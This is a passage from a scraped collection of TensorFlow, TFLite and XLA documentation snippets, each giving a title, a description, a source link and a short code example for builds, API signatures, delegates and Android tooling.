print(train_mnist.experimental_get_compiler_ir(images, labels)(stage='hlo'))
```

----------------------------------------

TITLE: Documenting Java Hexagon Delegate Class
DESCRIPTION: Defines the basic structure and key methods of the HexagonDelegate class in Java, which implements the TFLite Delegate interface and the Closeable interface for resource management.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/hexagon.md#_snippet_0

LANGUAGE: Java
CODE:
```
public class HexagonDelegate implements Delegate, Closeable {

  /*
   * Creates a new HexagonDelegate object given the current 'context'.
   * Throws UnsupportedOperationException if Hexagon DSP delegation is not
   * available on this device.
   */
  public HexagonDelegate(Context context) throws UnsupportedOperationException


  /**
   * Frees TFLite resources in C runtime.
   *
   * User is expected to call this method explicitly.
   */
  @Override
  public void close();
}
```

----------------------------------------

TITLE: Building TensorFlow Pip Package with Debug Info - Bash
DESCRIPTION: Builds the TensorFlow pip package using Bazel with the `--config=dbg` flag, which adds debugging information and disables optimization for C++ code. This is useful for debugging TensorFlow's C++ components. Note that kernels and dependencies are typically not built with debug info by default.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_17

LANGUAGE: bash
CODE:
```
bazel build --config=dbg //tensorflow/tools/pip_package:build_pip_package
```

----------------------------------------

TITLE: Building XLA for CPU Backend Inside Docker (Linux)
DESCRIPTION: Runs the Bazel build command inside the Docker container to compile the entire XLA project (`//xla/...`) targeting the CPU backend. The `--spawn_strategy=sandboxed` option is used for isolated execution, and `--test_output=all` ensures full test output is shown.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_2

LANGUAGE: shell
CODE:
```
docker exec xla bazel build //xla/...  --spawn_strategy=sandboxed --test_output=all
```

----------------------------------------

TITLE: Writing Custom Op Log File Python
DESCRIPTION: Shows how to use `tf.profiler.write_op_log` to save the created `OpLogProto` (containing custom op type definitions) to a specified directory. The second example includes `run_meta` (typically from `tf.RunOptions` and `tf.RunMetadata`) to incorporate run-time shape information needed for accurately calculating FLOPs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/command_line.md#_snippet_1

LANGUAGE: python
CODE:
```
tf.profiler.write_op_log(
    sess.graph, /tmp/my_op_log_dir, op_log)

# Get run-time shape information in order to fill shapes and get flops.
tf.profiler.write_op_log(
    sess.graph, /tmp/my_op_log_dir, op_log, run_meta)
```

----------------------------------------

TITLE: Get Tokenizer Associated Files TFLite Python
DESCRIPTION: This Python function signature defines a utility function to extract associated file paths from TFLite tokenizer metadata options. It takes one parameter, `tokenizer_options`, which can be None or one of the supported tokenizer metadata types (BertTokenizerOptions, SentencePieceTokenizerOptions, RegexTokenizerOptions). The function returns a list of optional strings, where each string represents an associated file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_tokenizer_associated_files.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_tokenizer_associated_files(
    tokenizer_options: Union[None, _metadata_fb.BertTokenizerOptionsT, _metadata_fb.
        SentencePieceTokenizerOptionsT, _metadata_fb.RegexTokenizerOptionsT]
) -> List[Optional[str]]
```

----------------------------------------

TITLE: Ordering Infeed Operations in XLA HLO
DESCRIPTION: Shows how to ensure a total order among multiple `Infeed` operations within a computation. In this example, the dependency between two `while` loops, where the second uses the result of the first as its initial value, enforces the required serialization of the `Infeed` calls.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_24

LANGUAGE: XLA HLO / C++-like
CODE:
```
result1 = while (condition, init = init_value) {
  Infeed(shape)
}

result2 = while (condition, init = result1) {
  Infeed(shape)
}
```

----------------------------------------

TITLE: Adding Bounding Box Coordinate Type using FlatBuffers Builder in Python
DESCRIPTION: Adds the specified coordinate type for bounding box properties within a FlatBuffers builder. This function is used during the process of generating metadata for TFLite models, associating bounding box information with a particular coordinate system. It requires a FlatBuffers builder instance and the integer value representing the coordinate type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesAddCoordinateType.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesAddCoordinateType(
    builder, coordinateType
)
```

----------------------------------------

TITLE: Getting Number of Classes from Metadata - Python
DESCRIPTION: Calculates and returns the total number of unique classes (items) present in the dataset based on the maximum item ID found in the provided metadata dictionary. It assumes class 0 is reserved and adds 1 to the maximum ID to get the total count.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_5

LANGUAGE: python
CODE:
```
@classmethod
get_num_classes(
    meta
) -> int

```

----------------------------------------

TITLE: Initializing tflite_support.metadata.MetadataDisplayer in Python
DESCRIPTION: Provides the constructor signature for the MetadataDisplayer class. It requires the model buffer, metadata buffer, and a list of associated files to initialize an instance for displaying information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata.MetadataDisplayer(
    model_buffer, metadata_buffer, associated_file_list
)
```

----------------------------------------

TITLE: Plotting TFLite Inference Results - Python
DESCRIPTION: Provides a Python function (`plot`) that uses Matplotlib (`plt`) to display a grid of images, showing the true image, its predicted class name, and highlighting whether the prediction was correct or incorrect using text color. It requires input images, the predicted labels, and the true labels, along with a list of class names. The snippet includes the function definition and a call to plot test data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_23

LANGUAGE: Python
CODE:
```
class_names = ['T-shirt/top', 'Trouser', 'Pullover', 'Dress', 'Coat',
               'Sandal', 'Shirt', 'Sneaker', 'Bag', 'Ankle boot']

def plot(images, predictions, true_labels):
  plt.figure(figsize=(10,10))
  for i in range(25):
      plt.subplot(5,5,i+1)
      plt.xticks([])
      plt.yticks([])
      plt.grid(False)
      plt.imshow(images[i], cmap=plt.cm.binary)
      color = 'b' if predictions[i] == true_labels[i] else 'r'
      plt.xlabel(class_names[predictions[i]], color=color)
  plt.show()

plot(test_images, predictions, true_labels)
```

----------------------------------------

TITLE: Getting Default Quantization Config (Python)
DESCRIPTION: Retrieves the default configuration for post-training quantization specific to this BrowserFftSpec model specification. This configuration can be used when exporting the model to TFLite format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_4

LANGUAGE: Python
CODE:
```
get_default_quantization_config()
```

----------------------------------------

TITLE: Defining Bazel Rule for Custom C++ Shared Object (Bazel BUILD)
DESCRIPTION: This Bazel BUILD file snippet defines a rule to create a custom C++ shared object for TensorFlow Lite. It first defines a selective C++ library using `tflite_custom_cc_library` for specific models and then wraps it in a shared object using `tflite_cc_shared_object`. Note that the exported APIs might be subject to change.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_6

LANGUAGE: bazel
CODE:
```
load(
    "//tensorflow/lite:build_def.bzl",
    "tflite_custom_cc_library",
    "tflite_cc_shared_object",
)

tflite_custom_cc_library(
    name = "selectively_built_cc_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)

# Shared lib target for convenience, pulls in the core runtime and builtin ops.
# Note: This target is not yet finalized, and the exact set of exported (C/C++)
# APIs is subject to change. The output library name is platform dependent:
#   - Linux/Android: `libtensorflowlite.so`
#   - Mac: `libtensorflowlite.dylib`
```

----------------------------------------

TITLE: Building TFLite Flex Shared Library (Desktop) - Shell
DESCRIPTION: This shell command builds the TensorFlow Lite Flex delegate shared library for desktop platforms using Bazel. It includes C++17 standard, optimization, the monolithic configuration, and specifies the host crosstool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_11

LANGUAGE: Shell
CODE:
```
bazel build -c opt --cxxopt='--std=c++17' \
      --config=monolithic \
      --host_crosstool_top=@bazel_tools//tools/cpp:toolchain \
      //tmp:tensorflowlite_flex
```

----------------------------------------

TITLE: Creating SyncSleep Python Wrapper Function (Python)
DESCRIPTION: Defines the public Python function `SyncSleep` that wraps the synchronous C++ sleep op. It takes a scalar float `delay` tensor and an optional `name` argument. The docstring clarifies that it's a blocking version, primarily for contrast with `AsyncSleep`. It calls the underlying generated op function (`gen_sleep_op.examples_sync_sleep`) passing the inputs and returns the output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_10

LANGUAGE: Python
CODE:
```
def SyncSleep(delay, name=None):
  """Pause for `delay` seconds (which need not be an integer).

  This is a synchronous (blocking) version of a sleep op. It's purpose is
  to be contrasted with Examples>AsyncSleep.

  Args:
    delay: tf.Tensor which is a scalar of type float.
    name: An optional name for the op.

  Returns:
    The `delay` value.
  """
  return gen_sleep_op.examples_sync_sleep(delay=delay, name=name)
```

----------------------------------------

TITLE: Initializing ImageEmbedderOptions Python
DESCRIPTION: This snippet shows the constructor signature for the `ImageEmbedderOptions` class. It requires a `base_options` object for base task configuration and optionally accepts an `embedding_options` object for output embedding processing settings, defaulting to a factory-created instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedderOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.vision.ImageEmbedderOptions(
    base_options: tflite_support.task.core.BaseOptions,
    embedding_options: tflite_support.task.processor.EmbeddingOptions = dataclasses.field(default_factory=_EmbeddingOptions)
)
```

----------------------------------------

TITLE: Bad Practice: Lambda Wrapped in Parentheses (Pre-TF 2.3) Python
DESCRIPTION: Demonstrates a practice to avoid in pre-TF 2.3: wrapping a lambda function declaration in parentheses. This can lead to auto-formatting tools splitting the code onto multiple lines, causing `inspect.getsource` issues and subsequent AutoGraph errors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_57

LANGUAGE: Python
CODE:
```
# Bad - wrapped in parentheses
my_lambda = (lambda x, y: x * y - y)
```

----------------------------------------

TITLE: Running TFLite Native Benchmark Binary - Shell
DESCRIPTION: Executes the native TensorFlow Lite benchmark command-line binary from the shell. It requires providing the path to the downloaded or built binary and passing arguments such as the model file path (`--graph`) and the number of threads (`--num_threads`). This is used for benchmarking on host machines or directly on Android devices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_5

LANGUAGE: Shell
CODE:
```
path/to/downloaded_or_built/benchmark_model \
  --graph=your_model.tflite \
  --num_threads=4
```

----------------------------------------

TITLE: Initializing BertCluAnnotatorOptions Class in Python
DESCRIPTION: This snippet shows the constructor signature for the `BertCluAnnotatorOptions` class. It requires a `base_options` object of type `tflite_support.task.core.BaseOptions` and optionally accepts `bert_clu_annotation_options` of type `tflite_support.task.processor.BertCluAnnotationOptions`, defaulting to a factory-created instance. It outlines the required parameters for creating an instance of the options class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotatorOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.text.BertCluAnnotatorOptions(\n    base_options: tflite_support.task.core.BaseOptions,\n    bert_clu_annotation_options: tflite_support.task.processor.BertCluAnnotationOptions = dataclasses.field(default_factory=_BertCluAnnotationOptions)\n)
```

----------------------------------------

TITLE: Get Statistics Metadata - TensorMetadata (Python)
DESCRIPTION: Retrieves the statistics metadata object associated with the tensor. This object contains information like min/max values, mean, standard deviation, or histograms.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_15

LANGUAGE: python
CODE:
```
Stats()
```

----------------------------------------

TITLE: Retrieving Android Board Platform Property (Java)
DESCRIPTION: Retrieves the Android system property 'ro.board.platform' by executing the 'getprop' command using ProcessBuilder. This value can be used to identify the hardware platform for performance analysis or creating device exclusion lists.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/nnapi.md#_snippet_3

LANGUAGE: java
CODE:
```
String boardPlatform = "";

try {
    Process sysProcess =
        new ProcessBuilder("/system/bin/getprop", "ro.board.platform").
        redirectErrorStream(true).start();

    BufferedReader reader = new BufferedReader
        (new InputStreamReader(sysProcess.getInputStream()));
    String currentLine = null;

    while ((currentLine=reader.readLine()) != null){
        boardPlatform = line;
    }
    sysProcess.destroy();
} catch (IOException e) {}

Log.d("Board Platform", boardPlatform);
```

----------------------------------------

TITLE: Initializing ClassificationTensorMd Class (Python)
DESCRIPTION: This Python snippet shows the constructor for the `ClassificationTensorMd` class. It allows specifying various metadata fields for a classification tensor, such as name, description, label files, tensor type, score calibration information, and the tensor name within the TFLite model. All parameters are optional.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/ClassificationTensorMd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.metadata_info.ClassificationTensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    label_files: Optional[List[LabelFileMd]] = None,
    tensor_type: Optional[_schema_fb.TensorType] = None,
    score_calibration_md: Optional[<a href="../../../tflite_support/metadata_writers/metadata_info/ScoreCalibrationMd"><code>tflite_support.metadata_writers.metadata_info.ScoreCalibrationMd</code></a>] = None,
    tensor_name: Optional[str] = None
)
```

----------------------------------------

TITLE: Generating compile_commands.json with Bazel and Python (Shell)
DESCRIPTION: This shell command generates the `compile_commands.json` file required by clangd for code analysis. It uses Bazel's `aquery` to find C++ compilation commands within the XLA source tree and pipes the output to a Python script that formats it into the `compile_commands.json` file. It must be executed from the root directory of the XLA repository.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/lsp.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel aquery "mnemonic(CppCompile, //xla/...)" --output=jsonproto | python3 build_tools/lint/generate_compile_commands.py
```

----------------------------------------

TITLE: Load File using TFLite Support Python
DESCRIPTION: This Python function loads the content of a file from the specified path. It takes the file path as a string and an optional mode ('rt' for text, 'rb' for binary, defaulting to 'rb') as arguments. The function returns the loaded file content as a string or bytes, depending on the specified mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/load_file.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.writer_utils.load_file(
    file_path: str, mode: str = 'rb'
) -> Union[str, bytes]
```

----------------------------------------

TITLE: Demonstrating Print Precedence over tf.print (Python/TensorFlow)
DESCRIPTION: This snippet defines a `tf.function` where `tf.print` is called before `print` in the source code. However, because `print` executes during graph construction and `tf.print` during graph execution, the output from `print` will appear before the output from `tf.print` when the function is traced.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_9

LANGUAGE: python
CODE:
```
@tf.function
def f(a):
  tf.print('At graph execution:', a)
  print('At graph construction:', a)
```

----------------------------------------

TITLE: Inspecting GatherV2 Nodes in Vectorized TensorFlow Graph Python
DESCRIPTION: Takes a TensorFlow GraphDef object (`gdef`), assumed to be the result of the previous snippet's concrete function, and filters its nodes to find all nodes with the operation type 'GatherV2'. It then prints the list of found nodes, allowing verification of how `tf.vectorized_map` transforms gather operations, potentially adding batch dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/parallel_for/index.md#_snippet_1

LANGUAGE: python
CODE:
```
gdef = concrete_vectorized.graph.as_graph_def()
print([n for n in gdef.node if n.op == "GatherV2"])
```

----------------------------------------

TITLE: Loading TF1 SavedModel with Loader API (Python)
DESCRIPTION: This snippet illustrates how to load a SavedModel in TensorFlow 1.x using the `saved_model.loader.load` function. It requires a TensorFlow session, the set of tags corresponding to the meta graph definition to load, and the directory path of the SavedModel. The variables and assets associated with the specified meta graph are restored into the supplied session.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/README.md#_snippet_1

LANGUAGE: python
CODE:
```
export_dir = ...
...
with tf.Session(graph=tf.Graph()) as sess:
  tf.saved_model.loader.load(sess, [tag_constants.TRAINING], export_dir)
  ...
```

----------------------------------------

TITLE: Checking for Missing Associated Files in ModelMetadata
DESCRIPTION: Checks if the list of associated files within the model metadata is empty or not present. Returns a boolean indicating the presence of associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_1

LANGUAGE: python
CODE:
```
AssociatedFilesIsNone()
```

----------------------------------------

TITLE: Destroying TensorFlow Lite External Delegate - C
DESCRIPTION: This C function (`tflite_plugin_destroy_delegate`) is used to release resources associated with a TensorFlow Lite delegate created by the `tflite_plugin_create_delegate` function. It accepts the delegate pointer and can handle NULL input gracefully.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/external/README.md#_snippet_1

LANGUAGE: C
CODE:
```
void tflite_plugin_destroy_delegate(TfLiteDelegate* delegate)
```

----------------------------------------

TITLE: Enable CoreML Delegate on All Devices (Objective-C)
DESCRIPTION: Shows how to initialize the TFLCoreMLDelegate in Objective-C using options to force its creation and use on all devices, bypassing the default restriction to devices equipped with a Neural Engine.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/coreml_delegate.md#_snippet_5

LANGUAGE: Objective-C
CODE:
```
TFLCoreMLDelegateOptions* coreMLOptions = [[TFLCoreMLDelegateOptions alloc] init];
    coreMLOptions.enabledDevices = TFLCoreMLDelegateEnabledDevicesAll;
    TFLCoreMLDelegate* coreMLDelegate = [[TFLCoreMLDelegate alloc]
                                          initWithOptions:coreMLOptions];

    // Initialize interpreter with delegate
```

----------------------------------------

TITLE: Applying Reshape to Flatten and Reshape (Conceptual)
DESCRIPTION: Illustrates the Reshape operation conceptually using array literals and the 'let' keyword. It shows how a 3D array with shape [4x2x3] is conceptually flattened into a 1D vector of 24 elements and then reshaped into a 2D array with shape [8x3], preserving element order based on a fastest-varying dimension layout.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_29

LANGUAGE: conceptual
CODE:
```
let v = f32[4x2x3] {{{10, 11, 12}, {15, 16, 17}},
                    {{20, 21, 22}, {25, 26, 27}},
                    {{30, 31, 32}, {35, 36, 37}},
                    {{40, 41, 42}, {45, 46, 47}}};

let v012_24 = Reshape(v, {24});
then v012_24 == f32[24] {10, 11, 12, 15, 16, 17, 20, 21, 22, 25, 26, 27,
                         30, 31, 32, 35, 36, 37, 40, 41, 42, 45, 46, 47};

let v012_83 = Reshape(v, {8,3});
then v012_83 == f32[8x3] {{10, 11, 12}, {15, 16, 17},
                          {20, 21, 22}, {25, 26, 27},
                          {30, 31, 32}, {35, 36, 37},
                          {40, 41, 42}, {45, 46, 47}};
```

----------------------------------------

TITLE: Downloading and Extracting MovieLens Dataset - Python
DESCRIPTION: Downloads the MovieLens dataset from its source URL, extracts the content into a specified directory, and returns the path to the resulting directory. This method handles the initial acquisition of the raw dataset files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
download_and_extract_movielens(
    download_dir
)
```

----------------------------------------

TITLE: Signature for Custom Checkpoint Restore Function in Python
DESCRIPTION: Specifies the required signature for a custom `restore_fn` used with `register_checkpoint_saver`. It must be a `@tf.function`, receives the filtered trackable objects and file prefix, and performs the restoration in place.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/saved_model/registration/README.md#_snippet_3

LANGUAGE: python
CODE:
```
@tf.function  # required decorator
def restore_fn(trackables, file_prefix): -> None
```

----------------------------------------

TITLE: Retrieving and Viewing TFLite Accuracy Report (ADB Shell)
DESCRIPTION: This complex ADB shell command chain retrieves the generated HTML accuracy report from the app's private storage directory on the Android device using `run-as` and `cat`. It then pipes the output to a temporary HTML file on the host machine and opens that file in the default web browser using `xdg-open` (common on Linux/WSL).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_15

LANGUAGE: ADB Shell
CODE:
```
adb shell run-as org.tensorflow.lite.benchmark.delegateperformance "cat /data/user/0/org.tensorflow.lite.benchmark.delegateperformance/files/delegate_performance_result/accuracy/report.html" > /tmp/dpb-accuracy.html && xdg-open /tmp/dpb-accuracy.html
```

----------------------------------------

TITLE: Executing TensorFlow Custom Op SyncSleep Stack (Python)
DESCRIPTION: This snippet demonstrates how to call the `stack50` function with the synchronous sleep op (`sleep_op.SyncSleep`) and a specified delay. It highlights the usage pattern for testing or using the synchronous custom op within a larger TensorFlow graph or function context.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_13

LANGUAGE: python
CODE:
```
  delay_seconds = 1.0
  stack50(sleep_op.SyncSleep, delay_seconds)
```

----------------------------------------

TITLE: Building XLA for CUDA Backend Natively (Linux)
DESCRIPTION: Runs the Bazel build command natively on the host system to compile the XLA project (`//xla/...`) targeting the CUDA backend. This requires a properly set up native environment with CUDA drivers and toolkit installed. Options include showing all test output and using a sandboxed spawn strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_10

LANGUAGE: shell
CODE:
```
bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Pushing Model Output Labels to Android via ADB Shell
DESCRIPTION: This ADB command transfers the model output labels text file (`${MODEL_LABELS_TXT}` on the host), which maps model output indices to category names, to the temporary directory (`/data/local/tmp/model_output_labels.txt`) on the Android device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
adb push ${MODEL_LABELS_TXT} /data/local/tmp/model_output_labels.txt
```

----------------------------------------

TITLE: Downloading Test Image (Python)
DESCRIPTION: Downloads a sample low-resolution JPEG image from a specified URL using `tf.keras.utils.get_file`. The function handles downloading and caching the file, returning the local path where the image is saved for later use in the super resolution inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
test_img_path = tf.keras.utils.get_file('lr.jpg', 'https://raw.githubusercontent.com/tensorflow/examples/master/lite/examples/super_resolution/android/app/src/main/assets/lr-1.jpg')
```

----------------------------------------

TITLE: Initializing TFLite Support Category Class - Python
DESCRIPTION: This snippet shows the constructor signature for the `tflite_support.task.processor.Category` class. It is used to create a new Category object representing a classification result, requiring an integer `index`, a float `score`, a `display_name` string, and a `category_name` string as input parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Category.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.Category(
 index: int, score: float, display_name: str, category_name: str
)
```

----------------------------------------

TITLE: Validate Wrapped JAX Model Python
DESCRIPTION: This snippet validates the newly created JAX wrapper model by running inference on the test image. It first converts the PIL image to a TensorFlow tensor, applies the custom TensorFlow pre-processor, runs the inference through the JAX model's `apply` method using the processed input (converted back to NumPy), and prints the predicted class using the model's label mapping.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
# Convert the raw image values to RGB tensor
raw_image_tensor = tf.convert_to_tensor(np.array(image, dtype=np.float32))

# Appy the above TF imape preprocessing to get an input tensor supported by Resnet50
input_tensor = resnet_image_processor(raw_image_tensor)

# Run the JAX model
jax_logits = jax_model.apply({}, input_tensor.numpy())

jax_predicted_class_idx = jax.numpy.argmax(jax_logits, axis=-1)
print("Predicted class:", model.config.id2label[jax_predicted_class_idx.item()])
```

----------------------------------------

TITLE: Check if Standard Deviation Array is None Python
DESCRIPTION: This method checks if the standard deviation array field is absent (None) in the normalization options schema data. It's useful for determining if standard deviation values were provided in the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_10

LANGUAGE: Python
CODE:
```
StdIsNone()
```

----------------------------------------

TITLE: Disabling Quantized Model Support for GPU Delegate C++
DESCRIPTION: This C++ snippet shows how to explicitly disable support for quantized models when creating the v2 GPU delegate. It initializes the default options, then sets the `experimental_flags` field to `TFLITE_GPU_EXPERIMENTAL_FLAGS_NONE` before creating the delegate using `TfLiteGpuDelegateV2Create` with the modified options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_7

LANGUAGE: cpp
CODE:
```
TfLiteGpuDelegateOptionsV2 options = TfLiteGpuDelegateOptionsV2Default();
options.experimental_flags = TFLITE_GPU_EXPERIMENTAL_FLAGS_NONE;

auto* delegate = TfLiteGpuDelegateV2Create(options);
if (interpreter->ModifyGraphWithDelegate(delegate) != kTfLiteOk) return false;
```

----------------------------------------

TITLE: Getting Output Tensor Names TFLite Python
DESCRIPTION: This Python function signature indicates how to call the `get_output_tensor_names` utility. It requires a `bytearray` representing the TFLite model buffer as input and returns a list of strings, where each string is the name of an output tensor from the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_output_tensor_names.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_output_tensor_names(
    model_buffer: bytearray
) -> List[str]
```

----------------------------------------

TITLE: Display Debugger Results CSV Header Shell
DESCRIPTION: Uses a shell command (`!head`) to display the initial lines of the debugger results CSV file. This helps verify that the file was created correctly and contains the expected data structure and columns.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_9

LANGUAGE: Shell
CODE:
```
!head /tmp/debugger_results.csv
```

----------------------------------------

TITLE: Loading Vocabulary from File - Python
DESCRIPTION: Reads and parses a vocabulary file, which is expected to be a JSON file containing a list of items with their ID, title, genres, and count. It returns an `OrderedDict` that maps each item's ID to a dictionary representing the item's details.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_6

LANGUAGE: python
CODE:
```
@classmethod
load_vocab(
    vocab_file
) -> collections.OrderedDict

```

----------------------------------------

TITLE: Running Comprehensive Code Checks Bash
DESCRIPTION: Executes a suite of code checks using BATS (Bash Automated Testing System) inside the Docker container. This script, `code_check_full.bats`, contains various static analysis and validation tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_14

LANGUAGE: Bash
CODE:
```
docker exec tf bats /usertools/code_check_full.bats --timing --formatter junit
```

----------------------------------------

TITLE: Example Implementation of CustomCall Target Function
DESCRIPTION: This C++ code provides an example implementation of a C function ('myfunc') compatible with the CustomCall signature. It shows how to cast the void pointers to specific array types to access input and output tensor data and perform operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_14

LANGUAGE: cpp
CODE:
```
extern "C" void myfunc(void* out, void** in) {
  float (&x)[2] = *static_cast<float(*)[2]>(in[0]);
  float (&y)[2][3] = *static_cast<float(*)[2][3]>(in[1]);
  EXPECT_EQ(1, x[0]);
  EXPECT_EQ(2, x[1]);
  EXPECT_EQ(10, y[0][0]);
  EXPECT_EQ(20, y[0][1]);
  EXPECT_EQ(30, y[0][2]);
  EXPECT_EQ(40, y[1][0]);
  EXPECT_EQ(50, y[1][1]);
  EXPECT_EQ(60, y[1][2]);
  float (&z)[3][3] = *static_cast<float(*)[3][3]>(out);
  z[0][0] = x[1] + y[1][0];
  // ...
}
```

----------------------------------------

TITLE: Initialize NormalizationOptions from Buffer Python
DESCRIPTION: This class method initializes a `NormalizationOptions` object by reading data from a given buffer at a specified offset. It is typically the entry point for deserializing the schema data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Initializing CUDA/CUDNN Repositories with Custom Dictionaries (Bazel)
DESCRIPTION: This snippet shows how to initialize the CUDA and CUDNN redistribution repositories using custom dictionaries defined directly in the WORKSPACE file. If the dictionaries contain `relative_path` entries, corresponding path prefixes (`cuda_redist_path_prefix`, `cudnn_redist_path_prefix`) must be provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_13

LANGUAGE: Bazel
CODE:
```
cuda_redist_init_repositories(
   cuda_redistributions = _CUSTOM_CUDA_REDISTRIBUTIONS,
